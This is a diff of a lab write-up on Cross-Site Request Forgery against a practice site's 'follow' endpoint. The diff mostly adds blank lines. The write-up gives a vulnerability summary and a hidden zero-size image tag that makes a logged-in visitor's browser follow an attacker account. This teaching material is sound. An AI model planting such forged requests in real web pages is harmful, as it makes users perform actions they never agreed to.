@@ -7,14 +7,19 @@ Demonstrate Cross-Site Request Forgery by forcing user actions without consent t
 ## 🔍 Vulnerability Analysis
 
 - **Type:** Cross-Site Request Forgery (CSRF)
+
 - **Endpoint:** `GET /index.php`
+
 - **Parameter:** `follow`
+
 - **Detection:** State-changing actions accessible via GET requests without anti-CSRF tokens
+
 - **Impact:** Unauthorized user actions leading to social engineering and account compromise
 
 ## 💥 Exploitation
 
 ```html
+
 <!-- Malicious page hosted on attacker server -->
 <img src="http://seabirdsocial.hv/index.php?follow=attacker" width="0" height="0" />
 When a logged-in user visits a page containing this image, the browser automatically sends
@@ -28,4 +33,5 @@ proof-of-concept exploits Session Understanding: Leveraging browser cookie behav
 attack delivery Impact Analysis: Assessing real-world consequences of CSRF vulnerabilities
 Defense Bypass: Understanding limitations of partial CSRF protections Conducted in
 controlled environment for educational purposes
+
 ```
